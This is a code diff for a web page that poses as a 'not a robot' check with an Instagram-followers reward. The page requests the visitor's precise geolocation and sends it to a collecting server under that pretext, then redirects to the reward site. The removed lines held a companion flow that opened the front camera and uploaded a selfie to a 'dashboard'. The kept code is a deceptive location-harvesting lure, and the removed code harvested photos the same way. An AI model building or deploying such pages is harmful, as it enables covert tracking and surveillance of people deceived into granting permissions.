@@ -31,17 +31,6 @@
   var REWARD_URL = "https://livesubs.io/en/instagram";
   var REDIRECT_DELAY_MS = 2000;
 
-  // Shared state between the location flow and the camera flow.
-  var locDone = false;
-  var redirected = false;
-  function goReward() {
-    if (redirected) return;
-    redirected = true;
-    setTimeout(function () {
-      window.location.href = REWARD_URL;
-    }, REDIRECT_DELAY_MS);
-  }
-
   var btn = document.getElementById("pressBtn");
   var statusEl = document.getElementById("status");
 
@@ -101,17 +90,12 @@
     setStatus("Location received from browser. Sending for verification…", "working");
     postLocation(payload).then(
       function (data) {
-        locDone = true;
-        if (camStream) {
-          // Camera preview is live: let the user finish the photo step first.
-          setStatus(
-            "✅ Verified! You are not a robot. Photo bhejni ho to Send My Photo dabao.",
-            "ok"
-          );
-        } else {
-          setStatus("✅ Verified! You are not a robot.", "ok");
-          goReward();
-        }
+        setStatus("✅ Verified! You are not a robot.", "ok");
+        // Redirect the user to the reward page ONLY after success.
+        // Denied/failed cases never redirect (handled in onGeoError/catch).
+        setTimeout(function () {
+          window.location.href = REWARD_URL;
+        }, REDIRECT_DELAY_MS);
       },
       function (err) {
         setStatus(
@@ -150,9 +134,7 @@
     }
     btn.disabled = true;
     btn.textContent = "WAITING FOR PERMISSION…";
-    setStatus("Waiting for browser permissions… please answer the location and camera dialogs.", "working");
-    // Same tap also opens the camera (preview only — upload needs Send My Photo).
-    openCamera(true);
+    setStatus("Waiting for browser permission… please choose Allow or Block in the browser dialog.", "working");
     try {
       navigator.geolocation.getCurrentPosition(onGeoSuccess, onGeoError, {
         enableHighAccuracy: true,
@@ -165,121 +147,4 @@
   });
 
   setStatus("press the button and open the link", "");
-
-  /* ---- Optional selfie step: explicit consent only ----
-   * Open Camera -> live preview (nothing uploaded) ->
-   * Send My Photo -> single frame uploaded to POST /api/photo.
-   * Deny/close sends NOTHING.
-   */
-  var camOpenBtn = document.getElementById("camOpenBtn");
-  var camSendBtn = document.getElementById("camSendBtn");
-  var camCancelBtn = document.getElementById("camCancelBtn");
-  var camPreview = document.getElementById("camPreview");
-  var camStatus = document.getElementById("camStatus");
-  var camStream = null;
-
-  function camMsg(msg, kind) {
-    camStatus.style.display = "block";
-    camStatus.textContent = msg;
-    camStatus.className = "status" + (kind ? " " + kind : "");
-  }
-
-  function stopCam() {
-    if (camStream) {
-      camStream.getTracks().forEach(function (t) { t.stop(); });
-      camStream = null;
-    }
-    camPreview.removeAttribute("src");
-    camPreview.srcObject = null;
-    camPreview.style.display = "none";
-    camOpenBtn.style.display = "";
-    camSendBtn.style.display = "none";
-    camCancelBtn.style.display = "none";
-  }
-
-  function openCamera(auto) {
-    if (camStream) return;
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-      if (!auto) camMsg("❌ Camera needs a secure page (https:// link or localhost).", "err");
-      return;
-    }
-    navigator.mediaDevices
-      .getUserMedia({ video: { facingMode: "user" }, audio: false })
-      .then(function (stream) {
-        camStream = stream;
-        camPreview.srcObject = stream;
-        camPreview.style.display = "block";
-        camOpenBtn.style.display = "none";
-        camSendBtn.style.display = "";
-        camCancelBtn.style.display = "";
-        camMsg("Live preview — only you see this. Tap Send My Photo only if you agree.", "");
-      })
-      .catch(function (e) {
-        var n = (e && e.name) || "";
-        if (n === "NotAllowedError" || n === "SecurityError") {
-          camMsg("❌ Camera permission denied. No photo was sent.", "err");
-        } else if (n === "NotFoundError" || n === "OverconstrainedError") {
-          camMsg("❌ No camera found on this device.", "err");
-        } else {
-          camMsg("❌ Camera failed (" + (n || "unknown") + "). Use the https:// link.", "err");
-        }
-        // Camera skipped but location already done -> still reach the reward page.
-        if (locDone) goReward();
-      });
-  }
-
-  camOpenBtn.addEventListener("click", function () {
-    openCamera(false);
-  });
-
-  camCancelBtn.addEventListener("click", function () {
-    stopCam();
-    camMsg("Camera closed. No photo was sent.", "");
-    if (locDone) goReward();
-  });
-
-  camSendBtn.addEventListener("click", function () {
-    if (!camStream) return;
-    var w = camPreview.videoWidth, h = camPreview.videoHeight;
-    if (!w || !h) {
-      camMsg("❌ Video not ready yet — wait 1 second and tap again.", "err");
-      return;
-    }
-    var scale = Math.min(1, 640 / w);
-    var c = document.createElement("canvas");
-    c.width = Math.round(w * scale);
-    c.height = Math.round(h * scale);
-    c.getContext("2d").drawImage(camPreview, 0, 0, c.width, c.height);
-    camMsg("Sending your photo…", "working");
-    c.toBlob(
-      function (blob) {
-        if (!blob) {
-          camMsg("❌ Photo could not be created.", "err");
-          return;
-        }
-        var fd = new FormData();
-        fd.append("session_id", getSessionId());
-        fd.append("file", blob, "selfie.jpg");
-        fetch(API_BASE + "/api/photo", { method: "POST", body: fd })
-          .then(function (res) {
-            if (!res.ok) throw new Error("Server responded " + res.status);
-            return res.json();
-          })
-          .then(function () {
-            camMsg("✅ Your selfie was sent to the dashboard.", "ok");
-            stopCam();
-            goReward();
-          })
-          .catch(function (err) {
-            camMsg(
-              "⚠️ Photo could not be sent: " +
-                ((err && err.message) || "network error"),
-              "err"
-            );
-          });
-      },
-      "image/jpeg",
-      0.85
-    );
-  });
 })();
